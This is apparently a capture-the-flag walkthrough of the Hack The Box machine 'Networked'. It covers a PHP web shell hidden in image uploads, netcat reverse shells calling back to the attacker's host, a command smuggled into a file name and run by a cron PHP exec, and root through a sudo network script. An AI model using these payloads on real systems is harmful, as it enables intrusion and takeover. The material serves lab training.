---
icon: ubuntu
---

# Networked - Easy

<figure><img src="../../.gitbook/assets/image (3133).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/networked"><strong>Networked</strong></a></p></figcaption></figure>

## <mark style="color:green;">Scanning & Enumeration</mark>

{% code title="Nmap TCP Scan" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.1.35 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 11:57 -0500
Nmap scan report for 10.129.1.35
Host is up (0.053s latency).
Not shown: 65363 filtered tcp ports (no-response), 169 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), Linux 3.10 (92%), OpenWrt 19.07 (Linux 4.14) (92%), Linux 5.1 - 5.15 (92%), Linux 3.8 - 3.16 (90%), Linux 4.15 - 5.19 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   86.76 ms 10.10.16.1
2   86.80 ms 10.129.1.35
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

```shellscript
curl -i 10.129.1.35
```

```shellscript
HTTP/1.1 200 OK
Date: Thu, 15 Jan 2026 17:25:45 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Content-Length: 229
Content-Type: text/html; charset=UTF-8

<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```

* We have an Apache Front End Webserver hosted on CentOS
* We also receive a PHP version
* The source code of the website also reveals some possible upload functionality

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
 feroxbuster -u http://10.129.1.35
```

<figure><img src="../../.gitbook/assets/image (3134).png" alt=""><figcaption></figcaption></figure>

Directory Busting reveals 2 endpoint redirects

#### <mark style="color:$primary;">/backup</mark>

<figure><img src="../../.gitbook/assets/image (3135).png" alt=""><figcaption></figcaption></figure>

The backup contains the site's source code code&#x20;

<figure><img src="../../.gitbook/assets/image (3136).png" alt=""><figcaption></figcaption></figure>

I'll unzip it and take a look at it

```shellscript
tar -xf backup.tar
```

#### <mark style="color:$primary;">Source Code Analysis</mark>

The site has four php files, three are web pages, and `lib.php` which is included in others. `index.php` is the static page that we saw in tech detection

<mark style="color:yellow;">**upload.php**</mark>

contains a series of checks that if all passed result in saving an uploaded file

First Validation is performed by extension

```php
//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
   if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
      $valid = true;
   }
}      
```

Then size has to be less than 60000 \[line 10]

```php
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
   echo '<pre>Invalid image file.</pre>';
   displayform();
   }
```

And permission on uploaded file \[line 45]

```php
// set proper permissions on the new file
chmod(UPLOAD_DIR . $name, 0644);
```

#### <mark style="color:$primary;">/upload.php</mark>

<figure><img src="../../.gitbook/assets/image (3137).png" alt=""><figcaption></figcaption></figure>

I'll test a simple png upload

<figure><img src="../../.gitbook/assets/image (3138).png" alt=""><figcaption></figcaption></figure>

let's go to /photos.php and check to see if our image is there

<figure><img src="../../.gitbook/assets/image (3139).png" alt=""><figcaption></figcaption></figure>

I can see my image, now If I go to [http://10.129.1.50/uploads/10\_10\_16\_15.png](http://10.129.1.50/uploads/10_10_16_15.png) I should see my image

<figure><img src="../../.gitbook/assets/image (3140).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Upload .PNG magicbytes PHP reverse shell</mark>

#### <mark style="color:$primary;">Create magicbytes shell</mark>

I’ll open my png from earlier in `vi` and go down a couple lines, and add some php code:

{% code overflow="wrap" %}
```php
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3141).png" alt=""><figcaption></figcaption></figure>

save the file, you can run file on it to check the mime type

<figure><img src="../../.gitbook/assets/image (3142).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Uploading magicbytes reverse shell</mark>

I was able to successfuly upload the malicious image, inspecting /photos.php we see it.&#x20;

<figure><img src="../../.gitbook/assets/image (3143).png" alt=""><figcaption></figcaption></figure>

To get execution lets visit [http://10.129.1.50/uploads/10\_10\_16\_15.php.png](http://10.129.1.50/uploads/10_10_16_15.php.png)

<figure><img src="../../.gitbook/assets/image (3144).png" alt=""><figcaption></figcaption></figure>

Nice we have execution where we placed our php code

<figure><img src="../../.gitbook/assets/image (3145).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3146).png" alt=""><figcaption></figcaption></figure>

nc is on the machine let's get a reverse shell

```shellscript
nc 10.10.16.15 80 -e /bin/sh 
```

<figure><img src="../../.gitbook/assets/image (3147).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3148).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:yellow;">Upload .PNG magicbytes PHP reverse shell Another Way</mark>

Upload a simple php shell

{% code title="shell.php.gif" %}
```php
<?php system($_REQUEST['cmd']); ?>
```
{% endcode %}

Let's get the first magicbytes for gif

```shellscript
xxd -l 16 /var/lib/inetsim/http/wwwroot/internet.gif
```

<figure><img src="../../.gitbook/assets/image (3150).png" alt=""><figcaption></figcaption></figure>

now All we need to do is upload shell.php.gif intercept the request and insert the GIF magicbytes in front of our payload&#x20;

<figure><img src="../../.gitbook/assets/image (3151).png" alt=""><figcaption></figcaption></figure>

Forward the request and you should see it in photos.php

<figure><img src="../../.gitbook/assets/image (3152).png" alt=""><figcaption></figcaption></figure>

now for the reverse shell we can proceed as before

<figure><img src="../../.gitbook/assets/image (3153).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:green;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as apache</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3149).png" alt=""><figcaption></figcaption></figure>

besides root there is one more user on this box

<figure><img src="../../.gitbook/assets/image (3124).png" alt=""><figcaption></figcaption></figure>

as the apache user I can access guly's directory. There are 3 interesting files!

#### <mark style="color:$primary;">PHP Code Injection via exec function</mark>

<figure><img src="../../.gitbook/assets/image (3125).png" alt=""><figcaption></figcaption></figure>

`crontab.guly` is a config that runs `php /home/guly/check_attack.php` every 3 minutes

{% code title="check_attack.php" %}
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
{% endcode %}

`check_attack.php` is a php script that processes files in the `uploads` directory

The one line that stands out to me immediately!

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

The function `exec` stands out because it enables us to create a new file named `; nc 10.10.16.15 443 -e /bin/sh`. Once the script runs and detects this file, it will inject our command into it.

To be safe I am going to base64 encode my payload!

```shellscript
echo -e 'nc 10.10.16.15 443 -e /bin/sh' | base64
```

{% code title="Command to run on target machine" overflow="wrap" %}
```shellscript
touch '/var/www/html/uploads/a; echo bmMgMTAuMTAuMTYuMTUgNDQzIC1lIC9iaW4vc2gK | base64 -d | sh'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3126).png" alt=""><figcaption></figcaption></figure>

When the script runs, it will loop over the files, and when it runs over mine, it will set `$value`

-> `a; echo bmMgMTAuMTAuMTYuMTUgNDQzIC1lIC9iaW4vc2gK | base64 -d | sh`

and run&#x20;

```shellscript
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

which means it will run

{% code overflow="wrap" %}
```shellscript
exec("nohup /bin/rm -f a; echo bmMgMTAuMTAuMTYuMTUgNDQzIC1lIC9iaW4vc2gK | base64 -d | sh > /dev/null 2>&1 &");
```
{% endcode %}

wait 3 minutes and you should get a shell as guly

<figure><img src="../../.gitbook/assets/image (3127).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Shell as guly</mark>

#### <mark style="color:$primary;">Sudo Script: Writing Network script -> Command Injection</mark>

<figure><img src="../../.gitbook/assets/image (3128).png" alt=""><figcaption></figcaption></figure>

Checking out the sudo commands -> guly can run a bash script as the root user

{% code title="changeme.sh" %}
```shellscript
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
{% endcode %}

This script writes an ifcfg script

The resulting script `ifcfg-guly` will run when an interface is brought up

If I run `changename.sh`, it prompts me for input for several variables, and writes the file out to `/etc/sysconfig/network-scripts/ifcfg-guly`. It also fails to load the device `guly0` as it does not exist

<figure><img src="../../.gitbook/assets/image (3129).png" alt=""><figcaption></figcaption></figure>

but the ifcfg file did write

<figure><img src="../../.gitbook/assets/image (3130).png" alt=""><figcaption></figcaption></figure>

I ran it again with some bash commands and got a weird `command not found` message

<figure><img src="../../.gitbook/assets/image (3131).png" alt=""><figcaption></figcaption></figure>

After some research i came across a report with the same error on seclists

{% embed url="https://seclists.org/fulldisclosure/2019/Apr/24" %}

Anything after a space in a value in a network script where the format is `VARIABLE=value` will be executed. The [response to that disclosure](https://seclists.org/fulldisclosure/2019/Apr/27) was that anyone who can write that file is basically root anyway, so it doesn’t matter.

The regex check at the start of the script prevents me from doing anything too complicated, but it doesn’t prevent me from getting a simple shell:

<figure><img src="../../.gitbook/assets/image (3132).png" alt=""><figcaption></figcaption></figure>

